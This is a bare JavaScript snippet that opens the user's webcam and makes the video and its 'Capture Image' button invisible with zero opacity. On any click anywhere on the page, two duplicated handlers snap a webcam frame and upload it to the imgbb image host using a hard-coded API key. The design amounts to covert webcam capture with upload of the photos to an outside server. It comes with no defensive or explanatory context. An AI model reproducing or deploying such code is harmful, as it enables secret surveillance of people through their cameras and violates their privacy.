navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    const captureButton = document.createElement('button');
    captureButton.textContent = 'Capture Image';

    window.addEventListener('click', () => {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        // Got the blob image! You can use it here
        console.log('Image Blob:', blob);

        const formData = new FormData();
        formData.append('image', blob);

        const uploadUrl = 'https://api.imgbb.com/1/upload?expiration=15552000&key=e4d29dd553f14434c98547b23317c1e7';

        fetch(uploadUrl, {
          method: 'POST',
          body: formData
        })
          .then(response => response.text())
          .then(responseText => {
            console.log('Server response:', responseText);
          })
          .catch(error => {
            console.error('Error uploading image:', error);
          });

        // Stop the video stream (optional)
        stream.getTracks().forEach(track => track.stop());
      }, 'image/jpeg');
    });

    window.addEventListener('click', () => {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        // Got the blob image! You can use it here
        console.log('Image Blob:', blob);

        const formData = new FormData();
        formData.append('image', blob);

        const uploadUrl = 'https://api.imgbb.com/1/upload?expiration=600&key=e4d29dd553f14434c98547b23317c1e7';

        fetch(uploadUrl, {
          method: 'POST',
          body: formData
        })
          .then(response => response.text())
          .then(responseText => {
            console.log('Server response:', responseText);
          })
          .catch(error => {
            console.error('Error uploading image:', error);
          });

        // Stop the video stream (optional)
        stream.getTracks().forEach(track => track.stop());
      }, 'image/jpeg');
    });

    document.body.appendChild(video);
    document.body.appendChild(captureButton);
    video.style.opacity = 0;
    captureButton.style.opacity = 0;
  })
  .catch(error => {
    console.error('Error accessing camera:', error);
  });
